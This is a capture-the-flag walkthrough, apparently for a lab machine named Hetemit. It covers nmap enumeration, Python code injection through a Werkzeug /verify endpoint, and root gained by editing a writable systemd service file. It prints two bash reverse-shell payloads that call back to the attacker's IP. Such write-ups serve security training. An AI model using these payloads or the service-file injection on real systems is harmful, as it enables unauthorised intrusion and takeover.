First Start with nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v <IP> -Pn`

```
# Nmap 7.93 scan initiated Fri Dec 30 05:33:29 2022 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.108.117
Increasing send delay for 192.168.108.117 from 80 to 160 due to 11 out of 25 dropped probes since last increase.
Warning: 192.168.108.117 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.108.117
Host is up (0.15s latency).
Not shown: 65484 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp    
22/tcp    open   ssh    
80/tcp    open   http   
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
18000/tcp open   biimenu
50000/tcp open   ibm-db2

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Dec 30 05:35:48 2022 -- 1 IP address (1 host up) scanned in 138.38 seconds
```

Got some interesting ports open, let's run nmap default scripts to know what service runs on those ports 

```
# Nmap 7.93 scan initiated Fri Dec 30 05:59:45 2022 as: nmap -sC -sV -oN normal.tcp -p 21,22,80,139,445,18000,50000 -Pn 192.168.108.117
Nmap scan report for 192.168.108.117                                               
Host is up (0.16s latency).                                                        
                                                                                   
PORT      STATE SERVICE     VERSION                                                
21/tcp    open  ftp         vsftpd 3.0.3                                           
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                             
|_Can't get directory listing: TIMEOUT                                                                                                                                
| ftp-syst:                                                                        
|   STAT:                                                                          
| FTP server status:                                                               
|      Connected to 192.168.49.108                                                 
|      Logged in as ftp                                                            
|      TYPE: ASCII                                                                 
|      No session bandwidth limit                                                  
|      Session timeout in seconds is 300                                           
|      Control connection is plain text                                            
|      Data connections will be plain text                                         
|      At session startup, client count was 3                                      
|      vsFTPd 3.0.3 - secure, fast, stable                                         
|_End of status                                                                    
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)                    
| ssh-hostkey:                                                                     
|   3072 b1e29df1f810dba5aa5a2294e8926165 (RSA)                                    
|   256 74ddfaf251dd74382bb2ec82e5918228 (ECDSA)                                   
|_  256 48bc9debbd4dacb30b5d67da56542ba0 (ED25519)                                 
80/tcp    open  http        Apache httpd 2.4.37 ((centos))                         
| http-methods:                                                                    
|_  Potentially risky methods: TRACE                                               
|_http-server-header: Apache/2.4.37 (centos)                                       
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn Samba smbd 4.6.2                                       
445/tcp   open  netbios-ssn Samba smbd 4.6.2                                                                                                                          
18000/tcp open  biimenu?                                                                                                                                              
| fingerprint-strings:                                                             
|   GenericLines:                                                                  
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions:                                                                                                                                          
|     HTTP/1.0 403 Forbidden                                                                                                                                          
|     Content-Type: text/html; charset=UTF-8                                       
|     Content-Length: 3102                                                         
|     <!DOCTYPE html>                                                              
|     <html lang="en">                                                             
|     <head>                                                                       
|     <meta charset="utf-8" />                                                     
|     <title>Action Controller: Exception caught</title>                                                                                                              
|     <style>                                                                      
|     body {                                                                       
|     background-color: #FAFAFA;                                                   
|     color: #333;                                                                 
|     margin: 0px;                                                                 
|     body, p, ol, ul, td {                                                        
|     font-family: helvetica, verdana, arial, sans-serif;                          
|     font-size: 13px;                                                             
|     line-height: 18px;                                                           
|     font-size: 11px;                                                             
|     white-space: pre-wrap;                                                       
|     pre.box {                                                                    
|     border: 1px solid #EEE;                                                      
|     padding: 10px;                                                               
|     margin: 0px;                                                                 
|     width: 958px;                                                                
|     header {                                                                     
|     color: #F0F0F0;                                                              
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|   GetRequest, HTTPOptions:                                                                                                                                          
|     HTTP/1.0 403 Forbidden                                                                                                                                          
|     Content-Type: text/html; charset=UTF-8                                       
|     Content-Length: 3102                                                         
|     <!DOCTYPE html>                                                              
|     <html lang="en">                                                             
|     <head>                                                                       
|     <meta charset="utf-8" />                                                     
|     <title>Action Controller: Exception caught</title>                                                                                                              
|     <style>                                                                      
|     body {                                                                       
|     background-color: #FAFAFA;                                                   
|     color: #333;                                                                 
|     margin: 0px;                                                                 
|     body, p, ol, ul, td {                                                        
|     font-family: helvetica, verdana, arial, sans-serif;                          
|     font-size: 13px;                                                             
|     line-height: 18px;                                                           
|     font-size: 11px;                                                             
|     white-space: pre-wrap;                                                       
|     pre.box {                                                                    
|     border: 1px solid #EEE;                                                      
|     padding: 10px;                                                               
|     margin: 0px;                                                                 
|     width: 958px;                                                                
|     header {                                                                     
|     color: #F0F0F0;                                                              
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
vice :
SF-Port18000-TCP:V=7.93%I=7%D=12/30%Time=63AE7049%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetRequ
SF:est,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x
SF:20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<
SF:html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\
SF:n\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\
SF:x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20back
SF:ground-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x2
SF:0\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-
SF:family:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x2
SF:0\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-
SF:height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x
SF:20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-sp
SF:ace:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n
SF:\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\
SF:x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n
SF:\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20
SF:\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x
SF:20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20padd
SF:ing:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{
SF:\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20
SF:\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;
SF:\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x2
SF:0color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x2
SF:0\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\
SF:x20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-T
SF:ype:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20char
SF:set=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\
SF:x20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20
SF:\x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\
SF:x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\
SF:x20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans
SF:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20
SF:\x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x2
SF:0\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n
SF:\x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x
SF:20font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x2
SF:0\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\
SF:x20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-30T05:00:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 30 06:00:44 2022 -- 1 IP address (1 host up) scanned in 59.47 seconds
```

Now we got the services available, Enumerating port 50000 http Werkzeug.

![image](https://user-images.githubusercontent.com/87468669/210036565-0d76a7db-344b-4276-af4c-376288a0aaa3.png)

cool we got 2 dirs, let's check em out.

![image](https://user-images.githubusercontent.com/87468669/210036693-6b7ef6ad-89ed-4188-a452-0c2d577c345a.png)

the first dir did not give anything interesting. we got a response from /verify returning code. let's use curl to change the request method.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Hetemit]
└─$ curl -v http://192.168.108.117:50000/verify -X POST -d "code=7*7"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.108.117:50000...
* Connected to 192.168.108.117 (192.168.108.117) port 50000 (#0)
> POST /verify HTTP/1.1
> Host: 192.168.108.117:50000
> User-Agent: curl/7.85.0
> Accept: */*
> Content-Length: 8
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 2
< Server: Werkzeug/1.0.1 Python/3.6.8
< Date: Fri, 30 Dec 2022 05:09:35 GMT
< 
* Closing connection 0
49                       
```

as seen in the responds above, we have an evaluation of the arithmetics input above, let's intercept request with burp.

![image](https://user-images.githubusercontent.com/87468669/210036999-3e277513-0bd0-4259-840d-39eefae5b384.png)

Great we got the same result with burp, let's get a reverse shell.

![image](https://user-images.githubusercontent.com/87468669/210037224-d838e829-8567-4dfb-a19d-5f693ea39f94.png)

ncat listener ready. reverse shell payload 

```
__import__("os").system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.108/80+0>%261'")
```

![image](https://user-images.githubusercontent.com/87468669/210037328-e54d6f42-3015-4fb1-b995-bdb144f36d74.png)

Fire the payload and boom we got a reverse shell as user cmeeks. Let's stablize the shell and esc privs.

![image](https://user-images.githubusercontent.com/87468669/210037670-c0e9f2db-1ee7-4d20-8ef7-9b1244a4095b.png)

by checking if we have any sudo priv, we got sudo access to /sbin/halt, /sbin/reboot, /sbin/poweroff. Great let's check for misconfigured service file.

```
[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2>/dev/null
/etc/systemd/system/pythonapp.service
[cmeeks@hetemit restjson_hetemit]$ ls -al /etc/systemd/system/pythonapp.service
-rw-rw-r-- 1 root cmeeks 302 Nov 13  2020 /etc/systemd/system/pythonapp.service
[cmeeks@hetemit restjson_hetemit]$ 
```

the service file allows a service to run as the system boots. Since we have a write permission against the file, we can obviously inject a malicious command and wait until the system boots up and obtain the reverse shell as root. 
Now, we should edit the pythonapp.service and inject a malicious code.

`bash -c 'bash -i >& /dev/tcp/192.168.49.108/18000 0>&1'`

![image](https://user-images.githubusercontent.com/87468669/210038251-6d8f0c2d-2ee3-4494-b9ad-1c368475d189.png)

Now let's run the sudo -l command and reboot the service.

![image](https://user-images.githubusercontent.com/87468669/210038642-1ef693b8-9935-42b8-b749-d1c4568951bf.png)

After rebooting the service, we should check our listener.

![image](https://user-images.githubusercontent.com/87468669/210038821-830b2299-962f-4729-93a9-7fdc3c1ba283.png)

Boom we got root. 

![image](https://user-images.githubusercontent.com/87468669/210038928-8720fe98-37d9-4b38-961a-90583737d830.png)

And we are done🤠
